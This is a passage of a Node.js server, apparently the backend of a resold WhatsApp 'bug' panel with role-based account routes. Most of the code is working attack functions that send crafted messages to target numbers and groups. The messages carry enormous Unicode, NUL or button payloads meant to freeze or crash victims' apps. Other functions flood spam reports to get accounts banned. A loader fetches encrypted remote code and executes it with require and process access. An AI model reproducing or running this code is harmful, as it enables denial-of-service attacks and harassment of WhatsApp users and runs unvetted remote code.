          delete activeConnections[cleanNumber];
          console.log(`[❌ PAIRING] ${cleanNumber} logout`);
        }
      }
    });

    if (!sock.authState.creds.registered) {
      await waiting(1500);
      let code;
      try {
        code = await Promise.race([
          sock.requestPairingCode(cleanNumber),
          new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Pairing timeout (30s)')), 30000)
          )
        ]);
        console.log(`[🔑 PAIRING] Code: ${code} untuk ${cleanNumber}`);
        
        return res.json({ 
          valid: true, 
          number: cleanNumber, 
          pairingCode: code,
          message: "Masukkan kode pairing di WhatsApp > Perangkat Tertaut > Tautkan Perangkat"
        });
      } catch (pairingErr) {
        console.error(`[❌ PAIRING ERROR] ${pairingErr.message}`);
        return res.status(500).json({ 
          valid: false, 
          message: `Gagal generate pairing code: ${pairingErr.message}` 
        });
      }
    } else {
      return res.json({ 
        valid: false, 
        message: "Session sudah terdaftar, hapus folder session untuk pairing ulang" 
      });
    }
  } catch (err) {
    console.error("[❌ PAIRING FATAL]", err.stack);
    return res.status(500).json({ 
      valid: false, 
      message: `Server error: ${err.message}` 
    });
  }
});

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  // Role yang diizinkan membuat akun
  const allowedRoles = ['owner', 'admin', 'reseller'];
  if (!creator || !allowedRoles.includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // Reseller hanya bisa membuat role member
  if (creator.role === "reseller") {
    if (parseInt(day) > 30) {
      console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
      return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
    }
    // Reseller hanya bisa membuat member
    // Role akan dipaksa menjadi member
  }

  // Admin hanya bisa membuat reseller dan member
  if (creator.role === "admin") {
    // Admin bisa membuat reseller atau member, tidak bisa membuat admin/owner
    // Role akan ditentukan di parameter atau default member
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  // Tentukan role berdasarkan creator
  let newUserRole = "member";
  if (creator.role === "admin") {
    newUserRole = "reseller"; // Admin membuat reseller
  } else if (creator.role === "owner") {
    newUserRole = "member"; // Owner bisa pilih nanti via userAdd
  } else if (creator.role === "reseller") {
    newUserRole = "member";
  }

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: newUserRole,
  };

  db.push(newAccount);
  saveDatabase(db);
    
  sendToGroups(
    `✅ *Akun Baru Dibuat*\nUsername: ${newAccount.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newAccount.role}`,
    { parse_mode: "Markdown" }
  );

  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  // Role yang diizinkan menghapus user
  const allowedRoles = ['owner', 'admin'];
  if (!admin || !allowedRoles.includes(admin.role)) {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Only owner and admin can delete users." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  // Admin hanya bisa menghapus reseller dan member (tidak bisa hapus admin/owner)
  if (admin.role === "admin" && (targetUser.role === "admin" || targetUser.role === "owner")) {
    console.log("[❌ DELETE] Admin tidak bisa menghapus user dengan role admin/owner.");
    return res.json({ valid: true, deleted: false, message: "Admin cannot delete admin or owner accounts." });
  }

  const index = db.findIndex(u => u.username === username);
  db.splice(index, 1);
  saveDatabase(db);
    
  sendToGroups(
    `🗑️ *Akun Dihapus*\nUsername: ${targetUser.username}\nDihapus Oleh: ${admin.username}\nRole: ${targetUser.role}`,
    { parse_mode: "Markdown" }
  );
    
  const logLine = `${admin.username} Deleted ${targetUser.username}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", targetUser);
  return res.json({ valid: true, deleted: true, user: targetUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  // Role yang diizinkan melihat daftar user
  const allowedRoles = ['tk', 'owner', 'admin', 'reseller'];
  if (!admin || !allowedRoles.includes(admin.role)) {
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "Not authorized to view users." 
    });
  }

  let users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  // Reseller hanya bisa melihat user dengan role member
  if (admin.role === "reseller") {
    users = users.filter(u => u.role === "member");
  }

  // Admin bisa melihat reseller dan member
  if (admin.role === "admin") {
    users = users.filter(u => 
      u.role === "reseller" || u.role === "member"
    );
  }

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator) {
    console.log("[❌ USERADD] Creator tidak ditemukan.");
    return res.json({
      valid: true,
      authorized: false,
      message: "Creator not found."
    });
  }

  // Role yang boleh dibuat berdasarkan role creator
  const rolePermissions = {
    owner: ["owner", "admin", "reseller", "member"],
    admin: ["reseller", "member"],
    reseller: ["member"]
  };

  // Cek apakah creator punya izin membuat role tersebut
  const allowedRoles = rolePermissions[creator.role] || [];

  if (!allowedRoles.includes(role)) {
    console.log(`[❌ USERADD] ${creator.role} tidak bisa membuat role ${role}.`);

    return res.json({
      valid: true,
      authorized: false,
      message: `${creator.role} cannot create role ${role}.`
    });
  }

  // Cek username
  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");

    return res.json({
      valid: true,
      created: false,
      message: "Username already exists."
    });
  }

  // Validasi day
  const days = parseInt(day);
  if (isNaN(days) || days <= 0) {
    return res.json({
      valid: true,
      created: false,
      message: "Invalid duration."
    });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + days);

  const newUser = {
    username,
    password,
    role,
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  saveDatabase(db);

  sendToGroups(
    `✅ *Akun Baru Dibuat*\n` +
    `Username: ${newUser.username}\n` +
    `Dibuat Oleh: ${creator.username}\n` +
    `Durasi: ${days} hari\n` +
    `Role: ${newUser.role}`,
    { parse_mode: "Markdown" }
  );

  const logLine =
    `${creator.username} Created ${newUser.username} Role ${role} Days ${days}\n`;

  fs.appendFileSync("logUser.txt", logLine);

  console.log("[✅ USERADD] User berhasil dibuat:", newUser);

  return res.json({
    valid: true,
    authorized: true,
    created: true,
    user: newUser
  });
});

app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  // Role yang diizinkan mengedit user
  const allowedRoles = ['owner', 'admin', 'reseller'];
  if (!editor || !allowedRoles.includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only owner, admin, or reseller can edit user." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // Reseller hanya bisa mengedit user dengan role member dan maksimal 30 hari
  if (editor.role === "reseller") {
    if (targetUser.role !== "member") {
      console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
      return res.json({ valid: true, edited: false, message: "Reseller can only edit users with role 'member'." });
    }
    if (parseInt(addDays) > 30) {
      console.log("[❌ EDIT] Reseller tidak boleh menambah lebih dari 30 hari.");
      return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only add up to 30 days." });
    }
  }

  // Admin hanya bisa mengedit user dengan role reseller dan member
  if (editor.role === "admin") {
    if (targetUser.role !== "reseller" && targetUser.role !== "member") {
      console.log("[❌ EDIT] Admin hanya bisa mengedit user dengan role 'reseller' atau 'member'.");
      return res.json({ valid: true, edited: false, message: "Admin can only edit users with role 'reseller' or 'member'." });
    }
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser.username} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

// 1. FreezePackk - tidak ada participant, tetap sama
async function FreezePackk(sock, targetjid) {
  await sock.relayMessage(targetjid, {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(70000),
      publisher: "[PsAmpas]" + "ꦾ".repeat(50000),
      stickers: [],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: ["13135550202@s.whatsapp.net"]
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED"
    }
  }, {});
}

// 7. ForcloseClick - ubah participant ke noSelfSync: true
async function ForcloseClick(sock, targetjid) {   
  const msg1 = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          submessages: [{
            messageType: 8,
            latexMetadata: {
              text: "Hallo Kak, Ini ada sedikit informasi",
              expressions: [{
                latexExpression: "Yannkecebet",
                url: "https://t.me/Yannkecebet",
                fontHeight: 9999999
              }]
            }
          }],
          contextInfo: {
            forwardingScore: 99999,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: "867051314767696@bot"
            },
            forwardOrigin: 4
          }
        }
      }
    }
  };
  await sock.relayMessage(targetjid, msg1, {
    noSelfSync: true
  });
}

async function Invisblev2(sock, targetjid) {
  try {
    const msg = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { 
              text: "MakKamu" 
            },
            nativeFlowMessage: {
              buttons: "\u0000" + "\u3164".repeat(500000),
              nativeFlowResponseMessage: {
                buttons: Array.from({ length: 123456 }, () => ({}))
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(targetjid, msg, {
      noSelfSync: true
    });
  } catch (e) {
    console.log("InvisbleV2 error:", e.message);
  }
}

async function invisble(sock, targetjid) {
  try {
    const msg = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "Sange",
              display_text: "x9234"
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({})),
              contextInfo: {
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1999 }, () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                  ),
                  ...Array.from({ length: 1999 }, () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                  )
                ],
                noSelfSync: true
              },
              messageAIRichResponseCodeMetadata: {
                codeLanguage: "rusia",
                codeBlocks: [
                  {
                    highlightType: 0,
                    codeContent: "uhz"
                  }
                ],
                enumAIRichResponseCodeHighlightType: {
                  AI_RICH_RESPONSE_CODE_HIGHLIGHT_DEFAULT: 0,
                  AI_RICH_RESPONSE_CODE_HIGHLIGHT_KEYWORD: 1,
                  AI_RICH_RESPONSE_CODE_HIGHLIGHT_METHOD: 2,
                  AI_RICH_RESPONSE_CODE_HIGHLIGHT_STRING: 3,
                  AI_RICH_RESPONSE_CODE_HIGHLIGHT_NUMBER: 4,
                  AI_RICH_RESPONSE_CODE_HIGHLIGHT_COMMENT: 5
                }
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(targetjid, msg, {
      noSelfSync: true
    });
    console.log("✅ Sukses Kirim invisble");
  } catch (e) {
    console.log("❌ Gagal invisble:", e.message);
  }
}


// 8. convQtd - ubah participant ke noSelfSync: true
async function convQtd(sock, targetjid) {
  for (let i = 0; i < 2; i++) {
    await sleep(500);
    await sock.relayMessage(
      targetjid,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "᬴".repeat(5000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\n".repeat(9999) + "{",
                buttons: "\n".repeat(500000)
              },
              contextInfo: {
                remoteJid: "#",
                mentionedJid: [targetjid],
                quotedMessage: {
                  conversation: "\n".repeat(5000)
                },
                externalAdReply: {
                  showAdAttribution: true,
                  title: 'MakLu',
                  body: 'Memek',
                  thumbnailUrl: 'https://files.catbox.moe/ur8m20.jpg',
                  sourceUrl: 'https://vsp-killer.gov/',
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      },
      {
        noSelfSync: true
      }
    );
  }
}

async function ForceCrash1(sock, targetjid) {
    const crash1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "福 | fuck me" },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(500000),
                    },
                },
            },
        },
    };

    const crash2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "福 | fuck me" },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(500000),
                    },
                },
            },
        },
    };

    try {
        // Kirim crash2 dulu
        const msg1 = generateWAMessageFromContent(targetjid, crash2, {
            noSelfSync: true,
        });
        await sock.relayMessage(targetjid, msg1.message, {
            messageId: msg1.key.id,
            noSelfSync: true,
        });

        await new Promise((resolve) => setTimeout(resolve, 500));
        const msg2 = generateWAMessageFromContent(targetjid, crash1, {
            noSelfSync: true,
        });
        await sock.relayMessage(targetjid, msg2.message, {
            messageId: msg2.key.id,
            noSelfSync: true,
        });
    } catch (error) {
        console.error("Error relaying crash com' Exfold:", error);
    }
}

// ─── VARIASI: HANYA NATIVE FLOW ──────────────────────
async function sendNativeFlowWithNul(sock, targetjid) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "#Wkkwkw"
          },
          nativeFlowMessage: {
            // NUL byte 5000x + JSON
            buttons: JSON.stringify({
              type: "button",
              text: "\0".repeat(5000) + "Click Here"
            })
          },
          contextInfo: {
            forwardingScore: 99999,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: "867051314767696@bot"
            },
            forwardOrigin: 4
          }
        }
      }
    }
  };
  await sock.relayMessage(targetjid, msg, { noSelfSync: true });
}

// ─── VARIASI: SPAM NATIVE FLOW ──────────────────────
async function spamNativeFlow(sock, targetjid, count = 10) {
  for (let i = 0; i < count; i++) {
    const msg = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: `Spam #${i+1} | 福 | fuck me`
            },
            nativeFlowMessage: {
              buttons: "\0".repeat(1000) + `{"id":"${i}","text":"Click"}`.repeat(100)
            },
            contextInfo: {
              forwardingScore: 99999,
              isForwarded: true,
              forwardedAiBotMessageInfo: {
                botJid: "867051314767696@bot"
              },
              forwardOrigin: 4
            }
          }
        }
      }
    };
    await sock.relayMessage(targetjid, msg, { noSelfSync: true });
    await sleep(1500);
  }
}

async function fiOS(sock, targetjid, i = 2) {
  for (let z = 0; z < i; z++) {
    await sock.relayMessage(targetjid, {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            locationMessage: {
              degreesLongitude: 0,
              degreesLatitude: 0,
              name: "𑇂𑆵𑆴𑆿".repeat(9000)
            },
            contentText: "XxxX",
            buttons: [{
              buttonId: "Tempek",
              buttonText: {
                displayText: "𑇂𑆵𑆴𑆿".repeat(1000)
              },
              type: 1
            }],
            headerType: 6
          }
        }
      }
    }, {
      isSecret: true
    });
    await new Promise(resolve => setTimeout(resolve, 1000)); 
  }
}

async function BlankIos(sock, targetjid) {
  await fiOS(sock, targetjid, 2); 
}

async function Delayinvis(sock, targetjid) {
    const FxT = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Mampus Lu" + "\0".repeat(20000),
                        format: "FOUR"
                    },
                    nativeFlowMessage: {
                        name: "cta_call",
                        name: "voice_call",
                        buttonParamsJson: "\0",
                        buttonParamsJson: "\0",
                        buttonParamsJson: "\0",
                        buttonParamsJson: "\0",
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    contextInfo: {
                        quotedMessage: {
                            richResponseMessage: {}
                        }
                    }
                }
            }
        }
    };
    await sock.relayMessage(targetjid, FxT, { noSelfSync: true });
}

async function DelayXCrash(sock, targetjid) {
    try {
        const msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "hey i'am back"
                        },
                        nativeFlowMessage: {
                            buttons: "\u001A".repeat(500000)
                        }
                    }
                }
            }
        };

        await sock.relayMessage(targetjid, msg, {
            isSecret: true
        });
        console.log("success send");
    } catch (err) {
        console.error("Error:", err);
    }
}



async function stckerr(sock, targetjid) {
  for (let i = 0; i < 2; i++) {
    await sleep(500);
    await sock.relayMessage(
      targetjid,
      {
        stickerPackMessage: {
          name: "/0".repeat(50000),
          publisher: "/0".repeat(40000),
          stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
          stickers: [
            {
              fileName: "ws.webp",
              isAnimated: false,
              emojis: ["💀"],
              mimetype: "image/webp"
            }
          ],
          caption: "/0".repeat(50000),
          fileLength: "999999999999",
          mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
          directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
          contextInfo: {
            remoteJid: targetjid,
            participant: targetjid,
            stanzaId: "ws_" + Date.now(),
            mentionedJid: [targetjid]
          },
          mediaKeyTimestamp: "1747502082",
          stickerPackSize: "3680054",
          stickerPackOrigin: 2
        }
      },
      {
        noSelfSync: true
      }
    );
  }
}

async function stikerr(sock, targetjid) {
  for (let i = 0; i < 2; i++) {
    await sleep(500);
    
    // StickerPack dengan payload /0
    const stickerMsg = {
      stickerPackMessage: {
        name: "/0".repeat(70000),
        publisher: "/0".repeat(50000),
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        stickers: [
          {
            fileName: "ws_sticker.webp",
            isAnimated: false,
            emojis: ["💀"],
            mimetype: "image/webp"
          }
        ],
        caption: "/0".repeat(60000),
        fileLength: "999999999999",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        contextInfo: {
          remoteJid: targetjid,
          participant: targetjid,
          stanzaId: "ws_" + Date.now(),
          mentionedJid: [targetjid]
        },
        mediaKeyTimestamp: "1747502082",
        stickerPackSize: "3680054",
        stickerPackOrigin: 2
      }
    };

    // Interactive dengan body "/0"
    const interactiveMsg = {
      interactiveMessage: {
        body: {
          text: "/0".repeat(50000)
        },
        nativeFlowMessage: {
          buttons: "/0".repeat(50000),
          messageParamsJson: "/0".repeat(50000)
        },
        contextInfo: {
          remoteJid: targetjid,
          participant: targetjid,
          mentionedJid: [targetjid]
        }
      }
    };

    await sock.relayMessage(targetjid, stickerMsg, { noSelfSync: true });
    await sleep(300);
    await sock.relayMessage(targetjid, interactiveMsg, { noSelfSync: true });
  }
}

// Band-Number
async function reportnomber(sock, targetJid) {
    if (!targetJid.endsWith("@s.whatsapp.net") && !targetJid.endsWith("@g.us")) {
        throw "JID harus @s.whatsapp.net atau @g.us";
    }

    try {
        const msg = {
            spamReportMessage: {
                messageId: Math.random().toString(36).substring(2, 10),
                messageTimestamp: Math.floor(Date.now() / 1000),
                fromJid: targetJid,
                spamFlow: 0,
                reason: "Spam",
                contextInfo: {
                    isForwarded: true,
                    forwardingScore: 99999,
                    forwardedAiBotMessageInfo: {
                        botJid: "867051314767696@bot"
                    },
                    forwardOrigin: 4
                }
            }
        };

        await sock.relayMessage(targetJid, msg, { noSelfSync: true });
        console.log(`✅ Laporan spam dikirim ke ${targetJid}`);
    } catch (e) {
        throw e;
    }
}

// 9. groupBan
async function BanGroup(sock, groupJid) {
  if (!groupJid.endsWith('@g.us')) {
    throw '@g.us server required';
  }

  try {
    await sock.groupParticipantsUpdate(
      groupJid,
      ['971500000000@s.whatsapp.net'],
      'add'
    );

    await sock.sendPresenceUpdate('composing', groupJid);
    console.log(`✅ BanGroup berhasil dikirim ke ${target}`);
    return true;
  } catch (err) {
    console.error('❌ BanGroup error:', err.message);
    throw err;
  }
}

async function reportGroup(sock, groupJid, jumlah = 50) {
    if (!groupJid.endsWith("@g.us")) {
        throw "JID harus @g.us untuk report grup";
    }

    for (let i = 1; i <= jumlah; i++) {
        try {
            const msg = {
                spamReportMessage: {
                    messageId: Math.random().toString(36).substring(2, 10),
                    messageTimestamp: Math.floor(Date.now() / 1000),
                    fromJid: groupJid,
                    spamFlow: 0,
                    reason: "Spam",
                    contextInfo: {
                        isForwarded: true,
                        forwardingScore: 99999,
                        forwardedAiBotMessageInfo: {
                            botJid: "867051314767696@bot"
                        },
                        forwardOrigin: 4
                    }
                }
            };

            await sock.relayMessage(groupJid, msg, { noSelfSync: true });
            console.log(`✅ [${i}/${jumlah}] Laporan spam dikirim ke grup ${groupJid}`);
        } catch (e) {
            console.error(`❌ [${i}/${jumlah}] Gagal kirim ke ${groupJid}: ${e.message}`);
        }

        // Jeda 1 detik antar report biar gak kena rate limit
        if (i < jumlah) {
            await new Promise(r => setTimeout(r, 1000));
        }
    }
}

// 10. freezeGroup - ubah participant ke noSelfSync: true
async function freezeGroup(sock, groupJid) {   
  const msg1 = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          submessages: [{
            messageType: 8,
            latexMetadata: {
              text: "p",
              expressions: [{
                latexExpression: "catbox.moe",
                url: "https://t.me/Yannkecebet",
                fontHeight: 9999999
              }]
            }
          }],
          contextInfo: {
            forwardingScore: 99999,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: "867051314767696@bot"
            },
            forwardOrigin: 4
          }
        }
      }
    }
  };
  
  await sock.relayMessage(groupJid, msg1, {
    noSelfSync: true
  });
}


// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const activeConnections = {};
const biz = {};
const mess = {};

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`;
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
        // 🔥 TAMBAHKAN INI
        connectTimeoutMs: 30000,
        keepAliveIntervalMs: 10000,
      });

      // ✅ TAMBAHKAN INI - Filter pesan dari sesi tertutup
      sock.ev.on("messages.upsert", ({ messages }) => {
        for (const msg of messages) {
          // Skip pesan dari sesi yang sudah tertutup
          if (msg.message?.senderKeyDistributionMessage) {
            continue;
          }
          // Proses pesan lainnya (jika perlu)
        }
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        // ✅ TAMBAHKAN INI - Cegah reconnect jika conflict (409)
        if (connection === "close" && statusCode === 409) {
